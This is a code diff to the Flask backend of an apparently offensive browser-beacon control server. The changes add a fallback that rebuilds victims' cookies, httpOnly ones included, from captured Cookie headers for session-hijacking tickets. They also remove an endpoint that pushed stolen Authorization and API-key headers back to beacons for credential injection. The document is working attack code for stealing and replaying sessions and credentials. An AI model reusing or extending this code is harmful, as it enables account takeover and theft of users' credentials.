@@ -3433,6 +3433,32 @@ def getBexTicket(domainID):
                 'value': c.value
             })
 
+    # Fallback: if individual cookie records are missing but we have a raw
+    # Cookie header (from INTERESTING_HEADERS), parse it to fill in the gaps.
+    # This handles the case where browser.cookies.getAll() failed silently
+    # but the header capture succeeded.
+    cookieNames = {c['name'] for c in cookies}
+    rawCookieHeader = next((h['value'] for h in headers if h['name'].lower() == 'cookie'), None)
+    if rawCookieHeader:
+        for pair in rawCookieHeader.split(';'):
+            pair = pair.strip()
+            if '=' in pair:
+                cName, cValue = pair.split('=', 1)
+                cName = cName.strip()
+                cValue = cValue.strip()
+                if cName and cName not in cookieNames:
+                    cookies.append({
+                        'name': cName,
+                        'value': cValue,
+                        'httpOnly': False,
+                        'secure': False,
+                        'sameSite': 'no_restriction',
+                        'path': '/',
+                        'domain': domain.domain,
+                        'expirationDate': None
+                    })
+                    cookieNames.add(cName)
+
     # Get URLs from visits, deduplicated, most recent first
     visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).all()
     seenUrls = set()
@@ -3468,7 +3494,6 @@ from proxy.server import (
     start_proxy_for_beacon, stop_proxy_for_beacon, stop_all_proxies,
     get_proxy_instance, get_all_proxy_instances, is_proxy_running_for,
     is_proxy_running, has_ws_connection,
-    set_spoof_config, get_spoof_config,
 )
 from proxy.certs import CA_CERT_PATH
 
@@ -3602,7 +3627,6 @@ def proxyStatus():
             'port': inst.port if inst else None,
             'authToken': inst.auth_token if inst else None,
             'wsConnected': has_ws_connection(beacon_uuid),
-            'spoofConfig': get_spoof_config(beacon_uuid),
         })
     else:
         # Summary of all running proxies
@@ -3618,81 +3642,6 @@ def proxyStatus():
             'running': len(proxies) > 0,
             'proxies': proxies,
         })
-
-
-@app.route('/api/proxy/spoof', methods=['POST'])
-@login_required
-def setProxySpoof():
-    """Toggle credential spoofing for a domain on a proxy beacon."""
-    content = request.json
-    domain = content.get('domain')
-    enabled = content.get('enabled', True)
-    beaconID_raw = content.get('beaconID')
-
-    if not beaconID_raw:
-        return jsonify({'error': 'beaconID required'}), 400
-
-    client = Client.query.filter_by(id=beaconID_raw).first()
-    if not client:
-        client = Client.query.filter_by(uuid=beaconID_raw).first()
-    if not client:
-        return jsonify({'error': 'Client not found'}), 404
-
-    beacon_uuid = client.uuid
-
-    if not is_proxy_running_for(beacon_uuid):
-        return jsonify({'error': 'No active proxy for this beacon'}), 400
-
-    set_spoof_config(beacon_uuid, domain, enabled)
-
-    # Build enriched spoof config with captured credential data for each enabled domain
-    spoofPayload = _build_spoof_payload(beacon_uuid)
-
-    # Notify the beacon of the updated spoof config so it knows which domains to inject creds for
-    client = Client.query.filter_by(uuid=beacon_uuid).first()
-    if client:
-        taskData = {
-            "type": "PROXY_SPOOF_UPDATE",
-            "spoofConfig": spoofPayload,
-        }
-        jsonStr = json.dumps(taskData)
-        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
-                                  code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
-        db_session.add(newJob)
-        dbCommit()
-
-    return jsonify({'status': 'ok', 'domain': domain, 'enabled': enabled})
-
-
-def _build_spoof_payload(beacon_uuid):
-    """Build per-domain spoof config with captured headers and user-agent.
-    Returns {domain: {enabled, headers: [{name, value}], userAgent: str}} for each domain."""
-    config = get_spoof_config(beacon_uuid)
-    payload = {}
-
-    client = Client.query.filter_by(uuid=beacon_uuid).first()
-    if not client:
-        return payload
-
-    for domain, enabled in config.items():
-        entry = {'enabled': enabled, 'headers': [], 'userAgent': client.rawUserAgent or ''}
-
-        if enabled:
-            # Find the BeaconDomain record for this domain
-            bd = BeaconDomain.query.filter_by(clientID=beacon_uuid, domain=domain).first()
-            if bd:
-                # Get captured headers (Authorization, x-api-key, etc.) — most recent wins
-                captures = BeaconCapture.query.filter_by(domainID=bd.id, captureType='header') \
-                    .order_by(BeaconCapture.capturedAt.desc()).all()
-                seen = set()
-                for c in captures:
-                    if c.name.lower() not in seen:
-                        seen.add(c.name.lower())
-                        entry['headers'].append({'name': c.name, 'value': c.value})
-
-        payload[domain] = entry
-
-    return payload
 
 
 @app.route('/api/jstap/proxy_ticket/<beaconID>', methods=['GET'])
